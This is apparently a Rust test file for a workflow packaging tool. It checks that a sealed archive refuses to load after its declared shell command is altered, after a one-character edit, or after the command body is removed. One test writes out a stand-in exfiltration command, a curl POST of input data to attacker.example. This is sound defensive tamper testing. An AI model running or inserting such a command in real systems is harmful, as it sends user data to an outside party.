//! The seal on a declared command, broken rather than read.
//!
//! A declared `run` body is executable authority: the server runs it with no
//! worker, so whatever the deployed archive says the command is, is what
//! executes. The claim that protects that — "editing a deployed command's
//! text without redeploying is impossible" — is the whole security boundary,
//! and a claim that has only been reasoned about is not a boundary.
//!
//! So these tests do not inspect the encoding. They assemble a real archive,
//! rewrite the command inside its `contract.json`, and require the loader to
//! REFUSE the result. If it ever loads, a declared `run` is not a reviewed
//! capability, it is remote code execution with extra steps.

use std::io::{Cursor, Read, Write};

use aion_awl::{ActionRequirement, CompiledWorkflow, compile};
use aion_awl_package::{AwlAssembleOptions, assemble_awl};
use aion_package::{ExtractionLimits, Package, PackageError};

type TestResult = Result<(), Box<dyn std::error::Error>>;

/// A document whose one action carries a declared command.
const DOCUMENT: &str = "\
//! Sealing fixture: one action, one declared command.
workflow sealed_command
  input text: String
  outcome stamped: type RunOutcome, route success

type RunOutcome { exit_code: Int, stdout: String, stderr: String }

worker shell_box
  action stamp(text: String) -> RunOutcome
    run \"echo $text\"

step stamp_it
  text |> stamp |> route stamped
";

fn assembled() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let compiled: CompiledWorkflow = compile(DOCUMENT, std::path::Path::new("."))?;
    assert!(
        compiled
            .actions
            .iter()
            .any(|action: &ActionRequirement| action.action == "stamp"),
        "the fixture must declare the action being sealed"
    );
    Ok(assemble_awl(&compiled, AwlAssembleOptions::default())?)
}

fn limits() -> ExtractionLimits {
    ExtractionLimits::bounded(256 * 1024 * 1024)
}

/// Rewrite `contract.json` inside an assembled archive, applying `edit` to the
/// parsed contract, and return the repacked archive bytes.
///
/// Every other entry is copied through byte-for-byte, so the ONLY difference
/// between the input and the output is the edit — which is what makes a
/// refusal attributable to the seal rather than to repacking.
fn rewrite_contract(
    archive_bytes: &[u8],
    edit: impl FnMut(&mut serde_json::Value),
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut edit = edit;
    let mut archive = zip::ZipArchive::new(Cursor::new(archive_bytes))?;
    let mut output = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let options: zip::write::FileOptions<'_, ()> =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    let names: Vec<String> = archive.file_names().map(str::to_owned).collect();
    for name in names {
        let mut entry = archive.by_name(&name)?;
        let mut bytes = Vec::new();
        entry.read_to_end(&mut bytes)?;
        drop(entry);

        if name == "contract.json" {
            let mut contract: serde_json::Value = serde_json::from_slice(&bytes)?;
            edit(&mut contract);
            bytes = serde_json::to_vec(&contract)?;
        }
        output.start_file(name, options)?;
        output.write_all(&bytes)?;
    }
    Ok(output.finish()?.into_inner())
}

/// The declared command as the contract records it, for a fixture whose
/// worker declares exactly one action.
fn command_of(contract: &serde_json::Value) -> Option<&str> {
    contract
        .get("workers")?
        .as_array()?
        .first()?
        .get("actions")?
        .as_array()?
        .first()?
        .get("body")?
        .get("command")?
        .as_str()
}

#[test]
fn an_assembled_archive_carries_the_declared_command_and_loads() -> TestResult {
    // The control. Without this, a refusal below could mean the archive was
    // never loadable in the first place and would prove nothing.
    let bytes = assembled()?;
    let package = Package::load_from_bytes(&bytes, limits())?;
    let contract = package
        .contract()
        .map_err(|error| format!("an assembled AWL package must carry a contract: {error}"))?;
    let json = serde_json::to_value(contract)?;
    assert_eq!(
        command_of(&json),
        Some("echo $text"),
        "the declared command must reach the deployed archive"
    );
    Ok(())
}

#[test]
fn rewriting_the_declared_command_makes_the_archive_refuse_to_load() -> TestResult {
    // THE test. A deployed package says `echo $text`; an attacker with write
    // access to the artifact changes it to exfiltrate. The loader must refuse.
    let tampered = rewrite_contract(&assembled()?, |contract| {
        if let Some(command) = contract
            .pointer_mut("/workers/0/actions/0/body/command")
            .filter(|value| value.is_string())
        {
            *command =
                serde_json::Value::String("curl -X POST https://attacker.example/$text".to_owned());
        }
    })?;

    // Prove the edit actually landed, so a refusal cannot be a false positive
    // from an edit that silently did nothing.
    let raw: serde_json::Value = {
        let mut archive = zip::ZipArchive::new(Cursor::new(&tampered))?;
        let mut entry = archive.by_name("contract.json")?;
        let mut bytes = Vec::new();
        entry.read_to_end(&mut bytes)?;
        serde_json::from_slice(&bytes)?
    };
    assert_eq!(
        command_of(&raw),
        Some("curl -X POST https://attacker.example/$text"),
        "the tamper must have actually rewritten the command"
    );

    match Package::load_from_bytes(&tampered, limits()) {
        Err(PackageError::IntegrityMismatch { .. }) => Ok(()),
        Err(other) => {
            Err(format!("expected an integrity refusal, got a different error: {other}").into())
        }
        Ok(_) => Err(
            "A REWRITTEN DECLARED COMMAND LOADED. The seal does not hold, and a \
                      declared `run` is arbitrary remote code execution."
                .into(),
        ),
    }
}

#[test]
fn a_one_character_command_edit_is_enough_to_refuse() -> TestResult {
    // The seal must not have a granularity below which edits slip through:
    // `echo $text` -> `echo $texT` is a different program invocation and must
    // be a different package.
    let tampered = rewrite_contract(&assembled()?, |contract| {
        if let Some(command) = contract
            .pointer_mut("/workers/0/actions/0/body/command")
            .filter(|value| value.is_string())
        {
            *command = serde_json::Value::String("echo $texT".to_owned());
        }
    })?;

    match Package::load_from_bytes(&tampered, limits()) {
        Err(PackageError::IntegrityMismatch { .. }) => Ok(()),
        Err(other) => Err(format!("expected an integrity refusal, got: {other}").into()),
        Ok(_) => Err("a one-character command edit loaded; the seal is not byte-exact".into()),
    }
}

#[test]
fn deleting_the_body_outright_makes_the_archive_refuse_to_load() -> TestResult {
    // The downgrade attack the presence/absence encoding exists to stop:
    // strip the body so the action looks like a plain worker requirement, and
    // the identity must still move. If this loaded, an attacker could turn a
    // sealed declared action into one served by a worker they control.
    let tampered = rewrite_contract(&assembled()?, |contract| {
        if let Some(action) = contract
            .pointer_mut("/workers/0/actions/0")
            .and_then(serde_json::Value::as_object_mut)
        {
            action.remove("body");
        }
    })?;

    let raw: serde_json::Value = {
        let mut archive = zip::ZipArchive::new(Cursor::new(&tampered))?;
        let mut entry = archive.by_name("contract.json")?;
        let mut bytes = Vec::new();
        entry.read_to_end(&mut bytes)?;
        serde_json::from_slice(&bytes)?
    };
    assert_eq!(
        command_of(&raw),
        None,
        "the tamper must have actually removed the body"
    );

    match Package::load_from_bytes(&tampered, limits()) {
        Err(PackageError::IntegrityMismatch { .. }) => Ok(()),
        Err(other) => Err(format!("expected an integrity refusal, got: {other}").into()),
        Ok(_) => Err(
            "a body-stripped archive loaded; a sealed action could be downgraded to \
                      one an attacker's worker serves"
                .into(),
        ),
    }
}

#[test]
fn repacking_without_editing_anything_still_loads() -> TestResult {
    // The negative control for the three tests above: the repack itself must
    // not be what causes the refusal. Same pipeline, no edit, still loads.
    let repacked = rewrite_contract(&assembled()?, |_| {})?;
    let package = Package::load_from_bytes(&repacked, limits())?;
    let json = serde_json::to_value(package.contract().map_err(|error| {
        format!("the repacked archive must still carry its contract: {error}")
    })?)?;
    assert_eq!(command_of(&json), Some("echo $text"));
    Ok(())
}
